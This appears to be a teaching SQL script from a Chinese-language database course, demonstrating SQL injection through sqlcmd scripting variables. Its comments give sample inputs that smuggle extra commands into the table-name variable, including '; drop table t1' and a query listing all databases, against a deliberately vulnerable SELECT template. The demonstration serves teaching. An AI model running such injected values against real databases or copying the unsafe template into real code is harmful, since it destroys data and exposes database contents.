/*

--SQL Injection
--在參數後加其它惡意指令
--如 tablename 後面加 where 1=1  或 ; drop table T1 或 ; select name from sys.databases

--原本
C:\> sqlcmd -E -i c:\ch2_script1_SQL_Injection_DB01.sql -v cols="employee_id, last_name" tabname="employees"

--改為
 
C:\> sqlcmd -E -i c:\ch2_script1_SQL_Injection_DB01.sql -v cols="employee_id, last_name" tabname="employees where 1=1"

C:\> sqlcmd -E -i c:\ch2_script1_SQL_Injection_DB01.sql -v cols="employee_id, last_name" tabname="employees; drop table t1"

C:\> sqlcmd -E -i c:\ch2_script1_SQL_Injection_DB01.sql -v cols="employee_id, last_name" tabname="employees; select name from sys.databases"



*/

USE db01
GO
SELECT  $(cols)  FROM  $(tabname)
GO


